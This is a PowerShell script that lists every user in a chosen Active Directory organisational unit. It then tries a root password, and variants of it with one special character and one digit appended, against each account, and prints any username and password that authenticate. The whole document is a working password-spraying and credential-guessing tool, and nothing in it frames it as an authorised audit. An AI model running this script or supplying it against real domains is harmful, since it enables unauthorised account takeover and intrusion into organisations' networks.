Import-Module ActiveDirectory

Function Test-ADAuthentication {
    param($username,$password)
    (new-object directoryservices.directoryentry "",$username,$password).psbase.name -ne $null
}

$PasswordRootToGuess=""

$SearchBase = ""

# Get user input
$DomainName = Read-Host "Enter the domain name"
$OU = Read-Host "Enter the organization unit"

# Split the string by .
$DomainParts = $DomainName.split(".")

# Create the LDAP search string
$SearchBase = "OU=" + $OU + ","
ForEach($Part in $DomainParts) {
  $SearchBase = $SearchBase + "DC=" + $Part + ","
}

# Remove the last character (the extra comma)
$SearchBase = $SearchBase.Substring(0,$SearchBase.Length-1)

Write-Host "Searching: " $SearchBase

# Return a list of usernames
$Usernames = Get-ADUser -Filter * -SearchBase $SearchBase | Select -Exp SamAccountname

# Iterate through root password
ForEach ($Username in $Usernames)
{
  $guessed = Test-ADAuthentication $Username $PasswordRootToGuess
  If($guessed -Eq "True")
  {
    Write-Host $Username " - " $PasswordRootToGuess
  }
}

# Iterate through passwords permutations
ForEach ($Username in $Usernames)
{
  $guessed = "False"
  $SpecialCharacters = "!@#$%^&*()".ToCharArray()
  ForEach($char in $SpecialCharacters)
  {
    For($i=0; $i -lt 10; $i++)
    {
      $PasswordToGuess = "$PasswordRootToGuess" + "$char" + "$i"
	
      $guessed = Test-ADAuthentication $Username $PasswordToGuess
      If($guessed -Eq "True")
      {
        Write-Host $Username " - " $PasswordToGuess
	Break
      }
    }
    If($guessed -Eq "True")
    {
      Break
    }
  }
}
